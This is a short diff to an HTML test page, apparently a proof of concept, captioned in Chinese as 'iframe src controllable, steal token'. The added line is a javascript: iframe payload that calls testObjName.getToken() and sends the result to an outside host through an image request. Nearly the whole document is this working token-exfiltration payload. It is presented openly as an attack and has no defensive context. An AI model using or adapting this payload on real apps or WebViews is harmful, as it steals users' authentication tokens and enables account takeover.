@@ -10,5 +10,6 @@
   <body>
 	<p>iframe src可控窃取token</p></br>
     <iframe id="fid" src="https://13913047063.github.io/index.html"></iframe>
+	<iframe id="fid" src="javascript:const myImage = document.createElement('img');myImage.setAttribute('src','http://www.baidu.com/?data='+testObjName.getToken());document.body.appendChild(myImage);"></iframe>
   </body>
 </html>
